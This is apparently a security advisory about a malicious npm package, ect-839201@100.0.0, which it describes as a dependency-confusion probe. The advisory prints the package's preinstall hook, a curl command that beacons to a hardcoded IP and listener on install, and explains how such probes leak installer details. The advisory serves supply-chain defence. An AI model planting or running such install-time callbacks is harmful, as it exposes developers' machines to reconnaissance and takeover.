summary: Dependency-confusion probe with preinstall callback to hardcoded private-IP endpoint
details: ect-839201@100.0.0 is a placeholder package (description "Probe", empty author, version 100.0.0, no index.js despite declaring main: index.js) whose package.json declares a preinstall lifecycle script that runs `curl http://10.107.121.85:8000/callback_ect839201`. On `npm install`, this fires automatically and beacons the installer to a hardcoded RFC1918 IP over plain HTTP at a path encoding the package name. This is the canonical dependency-confusion / namespace-takeover probe shape: confirm an internal package name resolved from the public registry, leak installer source IP / timing / user-agent to the attacker's listener. There is no legitimate functionality shipped — the callback is the package's only effect.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
